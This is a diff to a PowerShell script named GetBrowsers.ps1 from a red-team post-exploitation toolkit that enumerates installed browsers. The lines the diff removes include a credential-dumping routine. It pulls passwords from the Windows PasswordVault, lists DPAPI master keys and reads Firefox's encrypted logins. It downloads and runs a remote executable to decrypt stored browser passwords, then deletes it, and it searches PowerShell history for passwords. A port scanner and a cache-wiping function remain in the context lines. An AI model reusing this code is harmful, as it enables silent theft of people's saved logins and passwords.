@@ -1,92 +1,4 @@
-﻿<#
-.SYNOPSIS
-  Standalone Powershell Script to Leak Installed Browsers Information.
-
-  Author: r00t-3xp10it (SSA RedTeam @2020)
-  Required Dependencies: (iexplore|msedge), Firefox, Chrome
-  Optional Dependencies: mozlz4-win32.exe, DarkRCovery.exe
-  PS Script Dev Version: v1.20.8
-
-.DESCRIPTION
-   Standalone Powershell script to leak Installed browsers information sutch as: Home Page,
-   Browsers Version, Accepted Language, Download Directory, History, Bookmarks, Extentions,
-   StartPage, Stored Creds, Etc. The leaks will be saved to $env:TMP folder and Auto-deleted
-   in the end. Unless the 2º argument is used to input the Logfile permanent storage location.
-   'This script was written to enumerate the browsers installed under Microsoft systems'
-
-.NOTES
-   This cmdlet supports: Brave, Internet Explorer, Edge, Firefox, Chrome, Opera, Safari.
-
-   PS C:\> ./GetBrowsers.ps1 -FIREFOX
-   mozlz4-win32.exe (Optional Dependencie)
-   Used to convert firefox bookmarks files from: .jsonlz4 To: .json (More clean outputs)
-   mozlz4-win32 requires to be uploaded to $env:tmp folder for GetBrowsers.ps1 to use it.
-   url: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
-
-   PS C:\> ./GetBrowsers.ps1 -CREDS
-   DarkRCovery.exe (Optional Dependencie by 0xyg3n)
-   Used to decrypt firefox|chrome browser stored credentials to plain text.
-   DarkRCovery requires to be uploaded to $env:tmp folder for GetBrowsers.ps1 to use it.
-   url: https://github.com/0xyg3n/ihadtohost/blob/master/DarkRCovery.exe
-
-.EXAMPLE
-   PS C:\> ./GetBrowsers.ps1
-   Display a list of all arguments available
-
-.EXAMPLE
-   PS C:\> ./GetBrowsers.ps1 -RECON
-   Fast Recon (browsers, versions and interfaces)
-
-.EXAMPLE
-   PS C:\> ./GetBrowsers.ps1 -FIREFOX
-   Enumerates FireFox browser information Only.
-
-.EXAMPLE
-   PS C:\> ./GetBrowsers.ps1 -ALL
-   Enumerates IE (iexplore|msedge), FireFox, Chrome, Opera browsers information.
-   
-.EXAMPLE
-   PS C:\> ./GetBrowsers.ps1 -CHROME $env:USERPROFILE\Desktop
-   Enumerates Chrome browser and stores logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
-   GetBrowsers 2º parameter requires 'write permissions' on the directory we are sellecting.
-
-.EXAMPLE
-   PS C:\> ./GetBrowsers.ps1 -ADDONS $env:LOCALAPPDATA\Temp
-   Enumerates ALL browsers addons and stores logfile to: $env:LOCALAPPDATA\Temp\BrowserEnum.log
-   GetBrowsers 2º parameter requires 'write permissions' on the directory we are sellecting.
-
-.EXAMPLE
-   PS C:\> ./GetBrowsers.ps1 -SCAN 80,135,139,445
-   Enumerates local|remote host open|closed tcp ports 
-   This Function does not allow the permanent storage of the logfile
-   If none value its input after -SCAN then the most commonly hacked ports will be scanned
-
-.INPUTS
-   None. You cannot pipe objects to GetBrowsers.ps1
-
-.OUTPUTS
-   Browser Install Status Version           PreDefined
-   ------- ------- ------ -------           ----------
-   IE      Found   Stoped 9.11.19041.0      False     
-   CHROME  False   Stoped {null}            False     
-   FIREFOX Found   Stoped 94.0.1            False     
-   OPERA   Found   Active 85.0.4341.68      True      
-   SAFARI  Found   Stoped 5.1.7 (7534.57.2) False 
-   BRAVE   False   Stoped {null}            False     
-
-   Status       InterfaceDescription                          
-   ------       --------------------                          
-   Disconnected Realtek PCIe GBE Family Controller            
-   Up           Realtek 8821AE Wireless LAN 802.11ac PCI-E NIC
-
-.LINK
-    https://github.com/r00t-3xp10it/meterpeter
-    https://github.com/0xyg3n/ihadtohost/blob/master/DarkRCovery.exe
-    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowsers.ps1
-    https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
-#>
-
-
+﻿
 $Path = $null
 $mpset = $False
 $RUIUIUi0 = 'no'
@@ -113,7 +25,6 @@ If(-not($param1)){
     echo "./GetBrowsers.ps1 -FIREFOX          Enumerates Firefox browser information Only." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -OPERA            Enumerates Opera browser information Only." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -ADDONS           Enumerates ALL browsers extentions installed." >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -CREDS            Enumerates ALL browsers credentials stored." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -CLEAN            Enumerates|Delete ALL browsers cache files.`n" >> $LogFilePath\BrowserEnum.log
     echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates browser and stores logfile to 'tmp'." >> $LogFilePath\BrowserEnum.log
@@ -200,7 +111,6 @@ function ConvertFrom-Json20([object] $item){
     $powers_js = New-Object $JavaSerial
     return ,$powers_js.DeserializeObject($item) 
 }
-
 
 function BROWSER_RECON {
 
@@ -1043,132 +953,9 @@ function ADDONS {
         $Json|select-object -property name,version,update_url >> $LogFilePath\BrowserEnum.log
     }
 }
-
-
-function CREDS_DUMP {
-    ## Retrieve IE Credentials
-    echo "`n`n[ IE|MSEDGE ]" >> $LogFilePath\BrowserEnum.log
-
-    ## Retrieve Credentials from PasswordVault
-    # https://github.com/HanseSecure/credgrap_ie_edge/blob/master/credgrap_ie_edge.ps1
-    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
-    $vault = New-Object Windows.Security.Credentials.PasswordVault
-    $DumpVault = $vault.RetrieveAll()| % { $_.RetrievePassword();$_ }|Select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
- 
-    If(-not($DumpVault) -or $DumpVault -eq $null){
-        echo "------------------------------------------------" >> $LogFilePath\BrowserEnum.log
-        echo "None Credentials found => extracting master keys" >> $LogFilePath\BrowserEnum.log
-
-        ## None credentials found in Vault, trying to extract master keys
-        If(Test-Path -Path "$env:AppData\Microsoft\Protect\"){
-            $SIDPath = "$env:AppData\Microsoft\Protect\"
-            $StoreSID = dir "$SIDPath"|Select-Object -ExpandProperty Name -ErrorAction SilentlyContinue
-            echo "UserSID: $StoreSID" >> $LogFilePath\BrowserEnum.log
-            $UserSSIDir = cmd.exe /c dir /a /o-d /p "%AppData%\Microsoft\Protect\$StoreSID"|findstr /I /V /C:"<DIR>" /I /V /C:"Preferred" /I /V /C:"File" /I /V /C:"dir" /I /V /C:"volume"
-            $DelSpaces = $UserSSIDir|Where-Object {-not[string]::IsNullOrEmpty(([string]$_).trim())}
-            $SplitString = $DelSpaces -split('468')
-            $RegexSearch = $SplitString|Select-String -pattern '[a-zA-Z]'
-            $RawMasterKeys = $RegexSearch -replace ' ',''
-
-            ## Build table to display master keys leaked
-            echo "`nMaster keys" >> $LogFilePath\BrowserEnum.log
-            echo "-----------" >> $LogFilePath\BrowserEnum.log
-            If(-not($RawMasterKeys) -or $RawMasterKeys -eq $null){
-                $UserSID = $StoreSID.Substring(0,8)
-                echo "None master keys found in => [$UserSID]" >> $LogFilePath\BrowserEnum.log
-            }else{
-                echo $RawMasterKeys >> $LogFilePath\BrowserEnum.log
-            }
-        }else{
-            echo "None master keys found" >> $LogFilePath\BrowserEnum.log
-        }
-
-    }else{
-        echo "$DumpVault" >> $LogFilePath\BrowserEnum.log
-    }
-
-    ## Retrieve FireFox Credentials
-    echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
-    echo "------------------------------------------------" >> $LogFilePath\BrowserEnum.log
-    If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")){
-        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
-        If(-not(Test-Path "$Bookmarks_Path")){
-            echo "None Encrypted Credentials found" >> $LogFilePath\BrowserEnum.log
-        }else{
-            echo "Extracting => encrypted creds" >> $LogFilePath\BrowserEnum.log
-            $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
-            $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
-            $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
-            $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
-        }  
-    }else{
-        echo "Extracting => encrypted creds" >> $LogFilePath\BrowserEnum.log
-        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json"
-        $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
-        $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
-        $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
-    }
-
-    ## Leak Firefox|Chrome credentials to plain text { EXE Coded By 0xyg3n }
-    # DarkRCovery requires to be uploaded to $env:TMP { Client working dir }
-    echo "`n`n[ Leak credentials => By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-    echo "---------------------------------" >> $LogFilePath\BrowserEnum.log
-
-    If(-not(Test-Path "$env:TMP\DarkRCovery.exe")){
-        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/DarkRCovery.exe -Destination $env:TMP\DarkRCovery.exe|Out-Null
-    }
-
-
-    If(Test-Path "$env:TMP\DarkRCovery.exe"){
-    cd $env:TMP;Start-Process "$env:TMP\DarkRCovery.exe" -Wait # Wait for DarkRCovery.exe to finish ..
-        If(Test-Path "$env:TMP\Leaked.txt"){
-            $StoreCreds = Get-Content "$env:TMP\Leaked.txt" -ErrorAction SilentlyContinue
-            ## Check for powershell version [5] to Parse Data
-            $PSVersion = $PSVersionTable.PSVersion.Major
-            If($PSVersion -gt '4'){
-                ## Remove from output what i dont like
-                $ParseData = $StoreCreds|Select -Skip 1|Select -SkipLast 2
-                $RawCredentials = $ParseData -replace 'url:','Hostname:' -replace '\[PASSWORD\]',''
-            }else{
-                $RawCredentials = $StoreCreds
-            }
-            ## Remove logfile and the binary uploaded
-            Remove-Item -Path "$env:TMP\Leaked.txt" -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path "$env:TMP\DarkRCovery.exe" -Force -ErrorAction SilentlyContinue
-            echo $RawCredentials >> $LogFilePath\BrowserEnum.log
-            cd $IPATH
-        }else{
-            echo "Not found => `$env:TMP\Leaked.txt" >> $LogFilePath\BrowserEnum.log
-            cd $IPATH
-        }
-    }
-    
-    ## Search for passwords in { ConsoleHost_history }
-    If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")){
-        echo "`n`n[ Creds in ConsoleHost_history.txt ]" >> $LogFilePath\BrowserEnum.log
-        echo "------------------------------------" >> $LogFilePath\BrowserEnum.log
-        echo "Not found => ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
-    }else{
-        $Path = "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
-        $Credentials = Get-Content "$Path"|Select-String -pattern "passw","user","login","email"
-        If(-not($Credentials) -or $Credentials -eq $null){
-            echo "`n`n[ Creds in ConsoleHost_history.txt ]" >> $LogFilePath\BrowserEnum.log
-            echo "------------------------------------" >> $LogFilePath\BrowserEnum.log
-            echo "None Credentials found" >> $LogFilePath\BrowserEnum.log
-        }else{
-            ## Loop in each string found
-            $MyPSObject = ForEach ($token in $Credentials){
-                New-Object -TypeName PSObject -Property @{
-                    "[ Creds in ConsoleHost_history ]" = $token
-                }
-            }
-            echo "`n" $MyPSObject >> $LogFilePath\BrowserEnum.log
-        }
-    }
-}
  
 
-## Function tcp port scanner
+ ## Function tcp port scanner
 function PORTSCANNER {
 [int]$counter = 0
 
@@ -1365,7 +1152,6 @@ function BROWSER_CLEANTRACKS {
     }
 
 }
-
 
 ## Jump Links (Functions)
 If($param1 -eq "-IE"){IE_Dump}
